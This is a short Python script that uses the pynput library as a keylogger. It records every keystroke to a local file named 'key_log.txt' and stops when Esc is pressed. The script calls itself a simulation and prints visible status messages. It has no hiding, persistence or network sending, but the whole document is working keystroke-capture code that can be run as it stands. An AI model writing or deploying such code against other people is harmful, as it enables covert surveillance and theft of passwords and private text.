from pynput import keyboard
import time

# File where keystrokes will be saved
LOG_FILE = "key_log.txt"

def on_press(key):
    """
    This function runs every time a key is pressed.
    """
    try:
        # Alphanumeric keys (a, b, c, 1, 2...)
        current_key = str(key.char)
    except AttributeError:
        # Special keys (Space, Enter, Shift...)
        if key == keyboard.Key.space:
            current_key = " "
        elif key == keyboard.Key.enter:
            current_key = "\n" 
        else:
            # Format special keys nicely like [SHIFT]
            current_key = f" [{str(key).replace('Key.', '').upper()}] "

    # Append to file immediately (Real-time logging)
    with open(LOG_FILE, "a") as f:
        f.write(current_key)

def on_release(key):
    """
    This function runs when a key is released.
    We use it to stop the loop.
    """
    if key == keyboard.Key.esc:
        print("\n[!] Esc pressed. Stopping keylogger.")
        return False  # Stop listener

def main():
    print("[*] Keylogger Simulation Started.")
    print("[*] Saving keystrokes to 'key_log.txt'")
    print("[*] PRESS 'ESC' TO STOP THE LOGGING.")
    
    # Setup the listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()